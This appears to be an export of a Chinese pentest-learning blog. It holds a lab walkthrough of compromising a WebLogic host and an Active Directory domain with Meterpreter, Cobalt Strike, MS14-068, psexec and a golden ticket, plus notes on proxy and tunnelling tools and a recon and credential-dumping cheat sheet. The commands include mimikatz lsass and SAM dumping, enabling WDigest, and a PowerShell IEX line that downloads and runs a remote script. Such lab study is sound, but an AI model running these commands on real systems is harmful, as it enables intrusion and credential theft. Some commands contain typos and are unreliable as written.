<h1 id="0x02-WEB外网打点"><a href="#0x02-WEB外网打点" class="headerlink" title="0x02 WEB外网打点"></a>0x02 WEB外网打点</h1><p>arp-scan -l 扫描同网段</p>
<p><img src="https://s2.loli.net/2022/10/06/eOBgvMxaVGr8dDy.png" alt="image.png"></p>
<p>对WEB服务器进行扫描：</p>
<p>nmap -sS -v 192.168.50.238半开放扫描端口</p>
<p><img src="https://s2.loli.net/2022/10/06/D71XfkTescQSp4B.png" alt="image.png"></p>
<p>开启了80、445、1433、3389、7001端口</p>
<p>开放了HTTP服务、SQL Server服务、Weblogic服务</p>
<p>对PC服务器扫描端口开启了Mysql服务</p>
<p>对WEB服务器使用weblogic的漏洞路径进行验证，发现存在weblogic漏洞</p>
<pre><code>1./wls-wsat/CoordinatorPortType
2./wls-wsat/CoordinatorPortType11
/_async/AsyncResponseService
</code></pre>
<p>使用CVE-2019-2725对Weblogic页面进行测试，尝试之后使用MSF连接不了，才明白MSF攻击目标为Unix</p>
<p>拿JAVA反序列化工具上传Webshell</p>
<p><img src="https://s2.loli.net/2022/10/06/kl7SyBDeq6iZW9p.png" alt="image.png"></p>
<p>冰蝎派生会话给MSF</p>
<pre><code>1.use exploit/multi/handler
2.set payload java/meterpreter/reverse_tcp
3.set lhost 192.168.50.246
4.set lport 4444
</code></pre>
<p>并通过MSF上传CS生成的后门</p>
<p><img src="https://s2.loli.net/2022/10/06/9nj8HuavRIP1F6V.png" alt="image.png"></p>
<p>并且在CS上监听后门的端口5555</p>
<p><img src="https://s2.loli.net/2022/10/06/61HLulxhgyieJw4.png" alt="image.png"></p>
<p>使用MSF执行后门exe（360免杀，暂时没学，先关闭360）</p>
<h1 id="0x03-内网渗透"><a href="#0x03-内网渗透" class="headerlink" title="0x03 内网渗透"></a>0x03 内网渗透</h1><p><img src="https://s2.loli.net/2022/10/06/yoPAbOw8v6lnQKa.png" alt="image.png"></p>
<p>当前为Administrator权限，使用MS14-068提权</p>
<p><img src="https://s2.loli.net/2022/10/06/NmDj1iBkThMrOlJ.png" alt="image.png"></p>
<p>获取hash值</p>
<p><img src="https://s2.loli.net/2022/10/06/gM8ZP7mqSXGe1EB.png" alt="image.png"></p>
<p>Ipconfig 存在192.168.50.0&#x2F;24和10.10.10.0&#x2F;24网段,域控为10.10.10.10</p>
<p><img src="https://s2.loli.net/2022/10/06/wy4olbavKtjNYf5.png" alt="image.png"></p>
<p>查询域内用户</p>
<p><img src="https://s2.loli.net/2022/10/06/zhmUHNejcoty8uZ.png" alt="image.png"></p>
<p>查看域控</p>
<p><img src="https://s2.loli.net/2022/10/06/yKqlYo1NnjEw5iW.png" alt="image.png"></p>
<p>域内其他成员主机名</p>
<p><img src="https://s2.loli.net/2022/10/06/LkCqdor5JpuGM1x.png" alt="image.png"></p>
<p>查看域管理用户</p>
<p><img src="https://s2.loli.net/2022/10/06/y8cHqDwUA6hZWEb.png" alt="image.png"></p>
<p>PC和DC的IP</p>
<p><img src="https://s2.loli.net/2022/10/06/b8BaoFDeQkSJKzl.png" alt="image.png"></p>
<p>存在域环境，域名为de1ay.com，存在两台域主机WEB和PC，域控制器为DC.de1ay.com，主机名为DC，域管理员为Administrator</p>
<p>拿域控的权限，kali无法通过WEB服务器访问DC控制器，进行socks代理</p>
<p><img src="https://s2.loli.net/2022/10/06/6uSZoHF4cQJ13Ly.png" alt="image.png"></p>
<p>修改&#x2F;etc&#x2F;proxychains.conf</p>
<p><img src="https://s2.loli.net/2022/10/06/KaEqIuT64SFwj8O.png" alt="image.png"></p>
<p>代理使用nc命令探测，发现可以连通</p>
<p><img src="https://s2.loli.net/2022/10/06/vISCVgTeYW5lmEB.png" alt="image.png"></p>
<p>进行nmap端口扫描</p>
<p><img src="https://s2.loli.net/2022/10/06/JK31OkezvFZjqU4.png" alt="image.png"></p>
<p><img src="https://s2.loli.net/2022/10/06/bA1hVnPUq2gEk7B.png" alt="image.png"></p>
<p>两台内网主机均开启445端口</p>
<h2 id="psexec横向移动"><a href="#psexec横向移动" class="headerlink" title="psexec横向移动"></a>psexec横向移动</h2><p>1.原理：基于IPC共享，能够在没有开启telnet服务返回半交互的命令行</p>
<p>2.前提条件：目标开启445端口，启动psexec建立连接</p>
<p>在CS上创建listener</p>
<p><img src="https://s2.loli.net/2022/10/06/FpZTd2gbHi3loIR.png" alt="image.png"></p>
<p>对DC进行psexec传递攻击</p>
<p><img src="https://s2.loli.net/2022/10/06/hQo2KXvAtWlRsES.png" alt="image.png"></p>
<p><img src="https://s2.loli.net/2022/10/06/3S4Y1RHJl5K8zXP.png" alt="image.png"></p>
<p>发现主机DC上线</p>
<p><img src="https://s2.loli.net/2022/10/06/1Zdhv2sXF3fW6PC.png" alt="image.png"></p>
<p>同理，使用psexc将PC上线</p>
<h2 id="黄金票据制作（未成功）"><a href="#黄金票据制作（未成功）" class="headerlink" title="黄金票据制作（未成功）"></a>黄金票据制作（未成功）</h2><p>黄金票据</p>
<pre><code>黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心（KDC）证明用户已被其他域控制器认证。可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限
</code></pre>
<p>前提条件</p>
<pre><code>1.域名称
2.域的SID值
3.域的KRBTGT账户NTLM密码哈希
4.伪造用户名
</code></pre>
<p>获得KRBTGT账户NTLM密码哈希</p>
<p><img src="https://s2.loli.net/2022/10/06/howdO7kiAvpb6ft.png" alt="image.png"></p>
<p>获取SID</p>
<p><img src="https://s2.loli.net/2022/10/06/EStVD6Yn95IJToR.png" alt="image.png"></p>
<p>WEB机 Administrator 右键-&gt;Access-&gt;Golden Ticket</p>
<p><img src="https://s2.loli.net/2022/10/06/N6iLXrejMAEfgsG.png" alt="image.png"></p>
<p><img src="https://s2.loli.net/2022/10/06/XNFnwi7bOUYIkKW.png" alt="image.png"></p>
<h1 id="0x04-知识"><a href="#0x04-知识" class="headerlink" title="0x04 知识"></a>0x04 知识</h1><h2 id="NTLM原理"><a href="#NTLM原理" class="headerlink" title="NTLM原理"></a>NTLM原理</h2><p><strong>原理</strong></p>
<p>Window安全认证常见的为NTLM认证和Kerberos认证。NTLM采用一种质询&#x2F;问答信息交换模式</p>
<p><strong>过程</strong></p>
<p>1.步骤一</p>
<p>用户输入用户名和密码登入服务器，登录之前，客户端会将缓存密码的哈希值，原始密码会被丢弃。客户端向服务器发送访问资源，会向服务器发送一个请求，请求中包含明文的用户名。</p>
<p>2.步骤二</p>
<p>服务器收到请求后，生成一个16位的随机数，叫challenge</p>
<p>3.步骤三</p>
<p>客户端收到chanllenge，会利用步骤一生成的哈希值进行加密，返回服务器一个加密后的challenge</p>
<p>4.步骤四</p>
<p>服务器收到加密后的challenge，会向DC发送针对客户端的验证请求，请求包含用户的用户名、加密前的challenge、加密后的challenge</p>
<p>5.步骤五</p>
<p>DC根据用户名获取该帐号的密码哈希值，对原始的Challenge进行加密。如果加密后的Challenge和服务器发送的一致，则意味着用户拥有正确的密码，验证通过，否则验证失败</p>
<h2 id="Kerberos-域用户提权漏洞（MS14-068）"><a href="#Kerberos-域用户提权漏洞（MS14-068）" class="headerlink" title="Kerberos 域用户提权漏洞（MS14-068）"></a>Kerberos 域用户提权漏洞（MS14-068）</h2><p><strong>Kerberos协议</strong></p>
<p>Kerberos协议是计算机网络认证协议，允许某实体在不安全的环境下通信，向另一个实体以一种安全的方式证明自己身份。Kerberos服务器又称为密钥分发中心或KDC</p>
<p><strong>工作原理</strong></p>
<p>1.认证服务器（Authentication Server，简称 AS）：验证Client端的身份（确定你是身份证上的本人），验证通过就会给一张票证授予票证（Ticket Granting Ticket，简称 TGT）给 Client</p>
<p>2.一个票据授权服务器（Ticket Granting Server，简称 TGS）：通过 TGT（AS 发送给 Client 的票）获取访问 Server 端的票（Server Ticket，简称 ST）。ST（Service Ticket）也有资料称为 TGS Ticket</p>
<p><img src="https://s2.loli.net/2022/10/06/WN5dwpAacniJQE7.png" alt="image.png"></p>
<p>其可以为坐高铁，先买票(AS)，然后通过验票机(TGS)，随后在上火车那还需要验票过程(ST)</p>
<h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h1><p><a href="https://www.freebuf.com/articles/network/293184.html">MSF打的靶场</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1496451">kerberos原理</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>渗透学习</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>2022/10/05</title>
    <url>/2022/10/05/%E6%97%A5%E8%AE%B0-20221005/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="b275c531ec444b32b52ef35fb5f9f75bd1deb8e2cc31f39ca115819db15cb8ee">6d0774511472fc40695ef1e6d1064748fd914fe50ea59f638b349fdec211747f492ed0d071f1fa1de02b6756919b6ce69a7501acfce1939e77932ac4e91ef39a4d12b8d507e5f6470009e45e60b014d5b68567622bc6e7b495ccc96b59389a91f0e77de946a13273b953f4ff50d42e0b7f1ab64ea1b7a3d66d6f8573dde4c0e0332c11d39364fc5a74b2e48eb745887210b06615a539ee479d9c08f418c3b035b61e54858f53bbb1a7d6512723bf5f71d5333c56114b01e6cbc6c20ec693d127651fb69eb8647e0188efcd50b622573618bc16b78bac25637546c16f57382fe0d28eb0c67153fd936bf82ef7be9fd9d93183e33b5d6db9b79b4fbec6d41f4bfe1818b15f9b3fb8f2e8a4e32f39ad1ed271fa47e9370a7d7757e68f94fbeda653b2db6df12aba793f17b9d34a43ba14cd72a7ebc407574845a952935351825e77c7f3dc4b752f5a00f793ab7112336a7bdeef68c496fa05fe75fc6beebaa70b8cd8817254b674483f469a03aa9b5411da02d124f491148c846a8bd1fc465bf727e7e6a4ff27c733e76fc23d119ae3ce496d5df02019389dae98845b9fc0a814e5</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>日记</category>
      </categories>
  </entry>
  <entry>
    <title>内网代理转发工具</title>
    <url>/2022/10/05/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>端口转发就是将本机端口或者本机可以访问到任意主机的端口，转发到任意一台可以访问到的IP上，通常为公网IP</p>
<p>适合端口转发的场景：</p>
<p>1.服务器处于内网，可以访问外部网络</p>
<p>2.服务器处于内网，可以访问外部网络，但开启防火墙限制敏感端口连接</p>
<p>3.服务器处于内网，对外只开放80端口，且服务器不能访问外部网络</p>
<h2 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h2><pre><code>端口转发和端口映射区别
1、端口映射场景：外网主机A想访问内网主机B的服务
2、端口转发场景：外网主机A可以随意访问内网主机B的端口，却无法访问内网主机C的端口，需要将内网主机C的端口转发到B主机的端口
</code></pre>
<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>代理一般分为HTTP代理、socks代理、ftp代理、telnet代理、ssl代理</p>
<p><strong>正向与反向区别</strong></p>
<p>1、正向是一对多，反向是只允许一对特定服务</p>
<p>2、正向代理客户端，反向代理服务器</p>
<h2 id="隧道"><a href="#隧道" class="headerlink" title="隧道"></a>隧道</h2><p>服务器与客户端之间的中转站，确保安全通信。</p>
<h1 id="端口转发工具"><a href="#端口转发工具" class="headerlink" title="端口转发工具"></a>端口转发工具</h1><h2 id="概念讲解"><a href="#概念讲解" class="headerlink" title="概念讲解"></a>概念讲解</h2><h3 id="socket端口转发"><a href="#socket端口转发" class="headerlink" title="socket端口转发"></a>socket端口转发</h3><p>一条正常的socket隧道必备两端，一端为服务端，会监听端口等待客户端连接</p>
<p>一端为客户端，通过传入服务端的IP和端口，才会主动连接服务器。</p>
<p>合格的socket隧道有两种接口分别对应服务端和客户端，端口转发有4种工作状态，分别为</p>
<pre><code>1.客户端接客户端
2.客户端接服务端
3.服务端接服务端
4.服务端接客户端
</code></pre>
<h3 id="socket代理"><a href="#socket代理" class="headerlink" title="socket代理"></a>socket代理</h3><p>socket服务器作为中间人，帮助客户端去访问Internet</p>
<p>使用代理服务时，我们配置好代理服务器后，通过浏览器就可以访问任意网站。socket代理有一个交互协议，浏览器会将访问的IP和端口给socket服务器，socks服务端解析信息后，会代替浏览器访问目标网站</p>
<p><strong>两者异同</strong></p>
<p><strong>1、socket端口转发不需要通讯协议支持，socks代理需要socks协议支持</strong></p>
<p><strong>2、socket端口转发一对一，socket代理一对多</strong></p>
<h2 id="转发工具"><a href="#转发工具" class="headerlink" title="转发工具"></a>转发工具</h2><h3 id="MSF反弹木马"><a href="#MSF反弹木马" class="headerlink" title="MSF反弹木马"></a>MSF反弹木马</h3><p>使用条件</p>
<p>1.服务器通外网且有自己公网IP</p>
<p>2.目标服务器存在webshell</p>
<pre><code>#进入Mete转发目标主机192.168.50.238的3389端口到本地8888
portfwd add -l 8888 -p 3389 -r 192.168.50.238
#使用kali的rdesktop连接本地的8888端口
rdesktop 127.0.0.1:8888
</code></pre>
<p><a href="https://imgtg.com/image/p5MjX"><img src="https://i.imgtg.com/2022/10/05/p5MjX.png" alt="p5MjX.png"></a></p>
<h3 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h3><p>使用条件</p>
<p>1.服务器通外网且有自己公网IP</p>
<p>2.需上传lcx.exe到目标网站</p>
<p>3.lcx在Window为lcx.exe，在linux下为postmap</p>
<pre><code>#将目标服务器端口3389转发为原服务器9999
lcx.exe -slave  x.x.x.x(原服务器) 9999 x.x.x.x(目标服务器) 3389
#将转发出来的端口 要转发出去的端口
lcx –listen 9999 6666
访问127.0.0.1:6666

两种情况，适用于正向连接或反向连接

portmap
./portmap -m 2 -p1 3389 -h2 x.x.x.x -p2 9999

p1为监听的端口
p2为转发到的端口
-m 参数表示以什么方式用这个工具
  1.监听port1端口并连接主机2的port2端口
  2.监听port1和port2端口
  3.连接主机1对应端口和主机2对应端口
</code></pre>
<h3 id="ssh端口转发"><a href="#ssh端口转发" class="headerlink" title="ssh端口转发"></a>ssh端口转发</h3><p>能够将其他TCP端口的网络数据通过SSH转发</p>
<pre><code>-g：允许远程主机连接host的转发端口
   -f：后台执行ssh指令
   -C：允许压缩数据
   -N：不执行远程指令
   -R：将远程主机的某个端口转发到本地主机指定端口
   -L：将本地机的某个端口转发到远程指定机器的指定端口
   -p：指定远程主机的端口

反向代理 ssh -fCNR
正向代理 ssh -fCNL

本地端口转发（正向） #A通过一台访问B去访问C的服务，A不能直接访问C的服务，但是A可以访问B，B可以访问C的服务。
    ssh -CNFL a_port:c_ip:c_port b_user@b_ip
远程端口转发（反向）#把内网主机暴露出来，以便所有主机可以访问到主机A的服务，就需要一台公网访问的主机（B）给A做代理
  ssh -CNFR b_port:127.0.0.1:a_port b_user@b_ip
</code></pre>
<h3 id="iptables端口转发（未）"><a href="#iptables端口转发（未）" class="headerlink" title="iptables端口转发（未）"></a>iptables端口转发（未）</h3><h3 id="firewall端口转发（未）"><a href="#firewall端口转发（未）" class="headerlink" title="firewall端口转发（未）"></a>firewall端口转发（未）</h3><h1 id="socket代理工具"><a href="#socket代理工具" class="headerlink" title="socket代理工具"></a>socket代理工具</h1><p>Socks是一种代理服务，可以简单地将一端的系统连接到另外一端，支持多种协议，包括http、ftp请求及其它类型的请求。它分socks 4 和socks 5两种类型，socks 4只支持TCP协议，而socks 5支持TCP&#x2F;UDP协议，还支持各种身份验证机制等协议，其标准端口为1080。</p>
<p>socks在服务端监听服务端口，当有请求时会从socks协议解析访问目标端口；ProxyChains是Linux下的代理工具，kali已经安装，它可以使任何程序通过代理上网，允许TCP和DNS通过代理隧道，支持HTTP、SOCKS4和SOCKS5类型的代理服务器，并且可配置多个代理。</p>
<h2 id="基于WEB服务的sock代理工具"><a href="#基于WEB服务的sock代理工具" class="headerlink" title="基于WEB服务的sock代理工具"></a>基于WEB服务的sock代理工具</h2><h3 id="sock-proxychains"><a href="#sock-proxychains" class="headerlink" title="sock+proxychains"></a>sock+proxychains</h3><p><strong>1、sock4使用</strong></p>
<p>拿到一台web服务器的shell，发现存在内网IP，目的是使用kali工具探测内网端口服务，搭建sock4代理</p>
<p><img src="https://s2.loli.net/2022/10/05/pqe5iGryTtjBKuP.png" alt="image.png"></p>
<p>修改&#x2F;etc&#x2F;proxychains.conf</p>
<pre><code>socks4 127.0.0.1 8887 (kali_ip) (kali_port)
</code></pre>
<p><img src="https://s2.loli.net/2022/10/05/kHazOYryX3RlTEe.png" alt="image.png"></p>
<p>代理使用nc命令探测，发现可以连通</p>
<p><img src="https://s2.loli.net/2022/10/05/OxEgwktseci4DBQ.png" alt="image.png"></p>
<p>进行nmap端口扫描</p>
<p><img src="https://s2.loli.net/2022/10/05/gHrQ6Nz4mxXciRO.png" alt="image.png"></p>
<p><strong>2、搭建sock5代理</strong></p>
<p>先添加10的路由，让socket代理能通过域主机访问到内网机器</p>
<p> run autoroute -s 10.10.10.0&#x2F;24</p>
<p><img src="https://s2.loli.net/2022/10/05/xZCK38wFNtbQAdi.png" alt="image.png"></p>
<p>在kali机器开启socket代理</p>
<pre><code>msf6 &gt; use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) &gt; set srvhost 172.16.12.30

msf6 auxiliary(server/socks_proxy) &gt; run

msf6 auxiliary(server/socks_proxy) &gt; #按回车

[*] Starting the SOCKS proxy server

msf6 auxiliary(server/socks_proxy) &gt; jobs


</code></pre>
<p><img src="https://s2.loli.net/2022/10/05/XvzC6o2BIWPnhq8.png" alt="image.png"></p>
<p>显示如下为开启代理。</p>
<p>gedit &#x2F;etc&#x2F;proxychains.conf</p>
<p><img src="https://s2.loli.net/2022/10/05/DukAcoXT7Sy5fKL.png" alt="image.png"></p>
<p>代理扫描IP服务，扫描10段的1到10的机子的开放端口</p>
<pre><code>msf6 &gt; proxychains nmap -p 1-10000 -Pn -sT 192.168.11.3
</code></pre>
<h3 id="reGeorg（未）"><a href="#reGeorg（未）" class="headerlink" title="reGeorg（未）"></a>reGeorg（未）</h3><h3 id="Tunna（未）"><a href="#Tunna（未）" class="headerlink" title="Tunna（未）"></a>Tunna（未）</h3><h2 id="多层代理工具"><a href="#多层代理工具" class="headerlink" title="多层代理工具"></a>多层代理工具</h2><p>Earthworm（未）</p>
<p>Termite（未）</p>
<p>venom（未）</p>
<p>fuso（未）</p>
<h2 id="内网穿透工具"><a href="#内网穿透工具" class="headerlink" title="内网穿透工具"></a>内网穿透工具</h2><p>nps（未）</p>
<p>ngrok（未）</p>
<p>frp（未）</p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集命令</title>
    <url>/2022/10/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h1 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h1><pre><code>whoami /all                                                          #查看当前用户、权限
ipconfig /all                                                        #查看网络配置
route print                                                          #查看主机路由信息
systeminfo || systeminfo | findstr /B /C: “OS Name”  /C “OS Version” #查看操作系统信息
netstat -ano                                                         #查看端口连接信息
net session                                                          #查看当前会话列表
net share                                                            #查看当前网络共享信息
net use                                                              #查看已连接的网络共享
tasklist  || tasklist /SVC                                           #查看当前进程信息
wmic process get Name, ProcessId,ExecutablePath  #查询主机进程，并过滤进程的路径、名称和PID 
wmic process where Name=” msdtc.exe” get ExecutablePath # 查询指定进程的路径信息

wmic service get Caption,Name,PathName,StartName,State               #查询所有服务            
wmic service where Name=”backdoor” get Caption, PathName,State       #查询指定服务信息
schtasks /query /v /fo list                                          #查询计划任务信息
wmic startup get Caption,Command,Location,User                       #查询主机上所有的自启程序信息，并过滤出程序名称、执行的命令、程序的路径、所属用户                                       
wmic qfe get Caption,CSName,Description,HotFixID,InstalledOn         #查看主机安装的补丁列表，并过滤出补丁连接，名称，描述，补丁编号以及安装时间
wmic product get Caption,Version                                     #查看应用安装信息
net user || net user &lt;username&gt;     # 查看指定用户信息 || net localgroup administrators #查看本地管理员组
net user &lt;username&gt; &lt;password&gt; /add #创建本地用户 || net localgroup administrators &lt;username&gt; /add #将用户加入本地管理员组
query user                                                           #查看登录用户
</code></pre>
<h1 id="域"><a href="#域" class="headerlink" title="域"></a>域</h1><pre><code>1. 判断是否为域环境 
    net config workstation #查看工作站环境，包括当前计算机名、用户名、系统版本、工作站、登录域
    
2. 查看域用户
    net user /domain  #查看所有域用户
    net user &lt;username&gt; /domain #查看指定域用户详细信息
    wmic useraccount get Caption,Domain,Description
    所有与域相关的查询都需要通过域控制器来实现，并经过Kerberos协议来认证
    
3. 查看域用户组信息
    net group /domain #列出域内所有用户组
    net group “Domain Admins” /domain #查看域管理员组，包括所有的域管理员用户
    net group “Domain Computers” /domain #查看域成员主机组，得到域内所有客户端主机
    net group “Domain Users” /domain #查看域用户组，包括所有域用户
    net group “Enterprise Admins” /domain #查询企业系统管理员组，得到所有的企业系统管理员用户，该组是通用组，其中的成员对域林所有域拥有完全控制权，Domain Admins只是全局组，只对本域拥有完全控制权限
    
4. 查看域内密码策略
    net accounts /domain
    
5. 查看域控制器列表
    net group “Domain Controllers” /domain #查询域控制器组，得到所有域控制器的主机名
    nltest /DCLIST:hack-my.com # “hack-my.com” 为域名
    
6. 查看主域控制器
    net time /domain
  
7. 定位域控制器
    ping DC-1.hack-my.com

    也可以通过NDS服务器地址定位域控

8.	查看域信任关系
    
    nltest /domain_trusts
</code></pre>
<h1 id="资源探测"><a href="#资源探测" class="headerlink" title="资源探测"></a>资源探测</h1><h2 id="扫描存活主机"><a href="#扫描存活主机" class="headerlink" title="扫描存活主机"></a>扫描存活主机</h2><p><strong>1.基于ICMP扫描主机</strong></p>
<p>可以通过ICMP循环对整个网端的每个IP地址执行ping</p>
<pre><code>for /L %I in (1,1,254) D0 @ping -w 1 -n 1 10.10.10.%I | finstr “TTL”
</code></pre>
<p><strong>2.基于NetBios（网络基本输入&#x2F;输出系统）协议发现存活主机</strong></p>
<p>NetBios再TCP&#x2F;IP模型包括在应用层服务中，让不同计算机运行的不同程序可以在局域网相互连接和共享数据，实际利用时向局域网的每个IP地址发送NetBIOS状态查询，可以获得主机名、MAC地址等信息。</p>
<p>可以利用NBTScan程序，是一款扫描Windows网络的NetBIOS名称的程序，可以对给定IP范围的IP地址发送NetBIOS状态查询</p>
<p>上传nbtscan.exe到目标主机</p>
<pre><code>nbtscan.exe 10.10.10.1/24
</code></pre>
<p><strong>3.基于UDP发现存活主机</strong></p>
<p>将空的UDP报文发送到目标主机的特定端口，如果主机端口关闭，UDP探测就会得一个ICMP端口无法到达的回应报文，说明主机正在运行，到达开放端口，大部分服务仅仅忽略空报文不做回应</p>
<p>Unicornscan为Kali的信息收集工具</p>
<pre><code>unicornscan -mU 10.10.10.0/24
</code></pre>
<p><strong>4.基于ARP发现存活主机</strong></p>
<p>解析网络层地址来找数据链路层地址的网络传输协议，主机发送信息，会广播到局域网所有主机，返回信息后就加入ARP缓存，节约资源</p>
<p>1.ARP-Scan利用</p>
<pre><code>arp-scan.exe -t 10.10.10.0/24
</code></pre>
<p>2.Powershell利用</p>
<p>Empire渗透框架的Invoke-ARPScan.psl脚本</p>
<p>先将脚本导入执行</p>
<pre><code>Import-Module .\Invoke-ARPScan.ps1

Invoke-ARPScan -CIDR 10.10.10.0/24
</code></pre>
<p>也可以将脚本代码托管在服务器上，通过PowerShell远程加载运行</p>
<pre><code>powershell.exe -exec bypass -Commannd “IEX(New-Object Net.WebClient).DownloadString(’http://your-ip:port/Invoke-ARPScan.ps1’)”
</code></pre>
<p><strong>基于SMB协议发现存活主机</strong></p>
<p>SMB又称CIFS协议，CIFS使用NetBIOS或TCP发送，可用139或445端口</p>
<p>CrackMapExec工具，在kali linux上安装，能枚举登录用户、枚举SMB服务列表、执行WINRM攻击等功能</p>
<pre><code>crackmapexec smb 10.10.10.0/24
</code></pre>
<h2 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h2><p><strong>1.Telnet探测端口</strong></p>
<pre><code>telnet &lt;IP&gt; &lt;port&gt;
</code></pre>
<p><strong>2.Nmap端口扫描</strong></p>
<pre><code>nmap -p 80,88,135,139,443,8080,3306,3389 10.10.10.11

nmap -sS -p 1-65535 10.10.10.11 #扫描目标主机开放的全部端口

nmap -sC -sV -p 80,88,135,139,443,8080,3306,3389 10.10.10.11 #扫描并获取目标主机指定端口的服务版本
</code></pre>
<p><strong>3.PowerShell端口扫描</strong></p>
<p>NiShang是基于PowerShell的渗透测试专用框架，Scan模块也有Invoke-PortsCan.ps1脚本</p>
<pre><code>Invoke-PortScan -StartAddress 10.10.10.1 -EndAddress 10.10.10.20 -ResolveHost -ScanPort

powershell.exe -exec bypass -Command “IEX(New-Object Net.WebClient).DownloadString(”http://your-ip:port/Invoke-portscan.ps1”);Invoke-PortScan -StartAddress  10.10.10.1 EndAddress -10.10.10.20 -ResolveHost -ScanPort -Port 80,88,135,139,443,8080,3306,3389”
</code></pre>
<h2 id="获取Banner"><a href="#获取Banner" class="headerlink" title="获取Banner"></a>获取Banner</h2><p><strong>1.NetCat获取</strong></p>
<pre><code>nc -nv &lt;IP&gt; &lt;port&gt;

nc -nv 10.10.10.1521
</code></pre>
<p><strong>2.Telnet获取</strong></p>
<pre><code>telnet &lt;ip&gt; &lt;port&gt;
</code></pre>
<p><strong>3.nmap获取</strong></p>
<p>指定脚本 “—script&#x3D;banner”</p>
<pre><code>nmap —script=banner -p &lt;ports&gt; &lt;IP&gt;
</code></pre>
<h1 id="用户凭据获取"><a href="#用户凭据获取" class="headerlink" title="用户凭据获取"></a>用户凭据获取</h1><h2 id="获取域内单机密码和哈希值"><a href="#获取域内单机密码和哈希值" class="headerlink" title="获取域内单机密码和哈希值"></a>获取域内单机密码和哈希值</h2><p>所有本机用户的用户名、密码哈希值等信息都存储在SAM文件，位于系统的%SystemRoot%\System32\Config目录。lsass.exe</p>
<p><strong>Mimikatz获取用户凭证</strong></p>
<p>1.<strong>在线读取lsass进程内存</strong></p>
<p>将mimikatz.exe上传到目标主机，执行命令</p>
<pre><code>mimikataz.exe “privilege::debug” “sekurlsa::logonpasswords full” exit #privilege::debug,用于提升至Debug Privilege权限；sekurlsa::logon passwords 用于导出用户凭据
</code></pre>
<p>2.<strong>离线读取lsass内存文件</strong></p>
<p>将lsass.exe的进程内存转储，将内存文件导出本地后，使用Mimikatz进行离线读取。</p>
<p>用于转储工具，如OutMinidump.ps1、Procdump、SharpDump，或者手动加载系统自带的comsvcs.dll实现内存转储</p>
<p>在目标主机上传Procdump程序</p>
<pre><code>procdump.exe -accepteula -ma lsasse.exe lsass.dmp

mimikataz.exe  “sekurlsa::minidump lsass.dmp” “sekurlsa::logonpasswords full” exit \#“sekurlsa::minidump lsass.dmp” 用于加载内存文件；sekurlsa::logonpasswords,用于导出用户凭据
</code></pre>
<p>为了防止用户的明文密码在内存西俄楼，在Windows Server 2012及以上版本默认关闭 Wdigest功能，可以尝试修改注册表开启</p>
<p>#开启WDigest</p>
<pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UserLogonCredential /t REG_DWORD /d 1 /f
</code></pre>
<p>#关闭WDigest</p>
<pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UserLogonCredential /t REG_DWORD /d 0 /f
</code></pre>
<p><strong>3.在线读取本地SAM文件</strong></p>
<p>将mimikatz.exe上传到目标主机</p>
<pre><code>mimikatz.exe “privilege::debug” “token::elevate” “lsadump::sam” exit
    #privilege::debug 提升到DebugPrivilege权限
    #token::elevate 提升到SYSTEM权限
    #lsadump::sam提升到本地SAM文件
</code></pre>
<p><strong>4.离线读取本地SAM文件</strong></p>
<p>将SAM文件导出，使用Mimikatz加载并读取其中的用户登录凭据</p>
<p>首先在目标主机导出SAM和SYSTEM两文件，这两文件是锁住的，需要工具导出，使用PowerSploit项目的Invoke-NinjaCopy.ps1</p>
<pre><code>Invoke-NinjaCopy -Path “C:\Windows\System32\config\SAM” -LocalDestination C:\Temp\SAM

Invoke-NinjaCopy -Path “C:\Windows\System32\config\SYSTEM” -LocalDestination C:\Temp\SYSTEM
</code></pre>
<p>也可在管理员下执行命令，通过保存注册表的命令导出</p>
<pre><code>reg save HKLM\SAM sam.hive

reg save HKLM\SYSTE
</code></pre>
<p>复制到本地，用Mimikatz加载并</p>
<pre><code>mimikatz.exe “lsadump::sam /sam:sam.hive /system:system.hive” exit
</code></pre>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>猪猪侠大佬</title>
